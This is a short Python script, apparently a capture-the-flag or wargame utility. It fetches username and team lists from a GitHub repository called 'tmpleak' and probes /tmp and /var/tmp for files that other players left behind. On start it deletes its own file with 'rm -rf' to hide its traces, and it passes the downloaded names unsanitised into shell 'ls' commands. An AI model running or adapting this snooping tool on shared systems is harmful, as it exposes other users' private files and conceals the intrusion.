#-*- coding: utf-8 -*-
""" Made by stypr (https://harold.kim/) """
u='utf-8'
import os,sys
try: reload(sys);sys.setdefaultencoding(u);from urllib2 import urlopen
except: from urllib.request import urlopen
os.popen('rm -rf %s'%sys.argv[0]).read()
p='https://raw.githubusercontent.com/stypr/tmpleak/master'
q='/var/tmp/','/var/tmp/\\~','/var/tmp/.','/tmp/','/tmp/.','/tmp/\\~'
k=lambda x:x.decode(u).split('\n')
x=k(urlopen('%s/user.pwn'%(p,)).read())
y=k(urlopen('%s/team.pwn'%(p,)).read())
z=list(set([i for i in x+y if i and i.isalnum()]))
n=0
m=len(z)
t=40
c=lambda x:' '*(t-len(x))
for i in z:
 n+=1;f='\r[%s/%s] Checking %s...%s'%(n,m,i,c(i));sys.stdout.flush();sys.stdout.write(f)
 for j in q:
  a='ls -al "%s" 2>&1';b='\n[Found: %s]\n%s';e='No such file or directory';r=os.popen(a%(j+i)).read();s=os.popen(a%(j+i.lower())).read()
  if e not in r or e not in s:
   sys.stdout.flush()
   if e in r:print(b%(j+i.lower(),s))
   else:print(b%(j+i,r))
print
